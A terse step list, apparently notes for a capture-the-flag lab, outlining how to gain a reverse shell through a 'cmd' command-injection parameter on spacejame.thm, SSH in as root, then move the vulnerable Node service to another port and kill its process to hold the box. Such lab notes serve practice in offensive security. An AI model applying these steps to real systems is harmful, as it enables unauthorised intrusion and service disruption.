1) make a listener nc
2) goto spacejame.thm:3000/?cmd=$pythonshellcode
3) [PassProtect]
4) do ssh with root@space.thm
5) nano /home/bunny/simple-command-injection/server.js
6) change app.listen 3000 to another port
7) kill the node process
	ps -aux | grep "node"
	kill -9 %PID
8) Be King ; Get The Fl4G
